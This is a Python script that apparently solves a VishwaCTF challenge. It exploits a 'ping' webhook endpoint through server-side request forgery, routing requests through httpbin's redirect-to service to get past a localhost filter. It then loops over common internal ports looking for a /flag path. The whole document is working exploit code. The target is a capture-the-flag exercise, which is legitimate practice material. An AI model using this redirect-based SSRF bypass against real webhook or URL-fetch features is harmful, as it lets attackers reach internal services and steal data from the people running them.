#!/usr/bin/env python3
import requests

BASE = "https://ping.vishwactf.com"

# Use httpbin redirect to bypass localhost filter
ports = [3000, 5000, 8000, 8080, 9000, 3001, 5001]

for port in ports:
    print(f"\n[*] Port {port}...")
    url = f"https://httpbin.org/redirect-to?url=http://localhost:{port}/flag"
    r = requests.post(f"{BASE}/api/ping", json={"webhook_url": url})
    res = r.json()
    if res.get('success'):
        preview = res.get('preview', '')
        print(f"[+] Success! Preview: {preview[:300]}")
        if "VishwaCTF{" in preview:
            print(f"\n[!!!] FLAG: {preview}")
            break
